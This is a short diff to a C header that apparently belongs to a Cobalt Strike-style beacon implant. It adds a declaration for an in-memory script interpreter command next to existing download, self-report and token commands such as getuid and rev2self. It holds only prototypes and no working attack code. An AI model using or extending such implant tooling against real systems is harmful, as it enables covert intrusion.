@@ -121,6 +121,10 @@ BOOL beacon_download_buffer(const char * filename, const char * buffer, unsigned
 /* tier-3 item11 (4.12 beacon_info): in-memory layout self-report */
 void command_beacon_info(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
 
+/* tier-3 item12 (4.13 Beacon Interpreter): run a TS-transformed C script in
+ * the vendored picoc VM (src/interpreter/binterp.cpp for the wire format) */
+void command_interpreter(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
+
 /* token related commands */
 void command_getuid(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
 void command_rev2self();
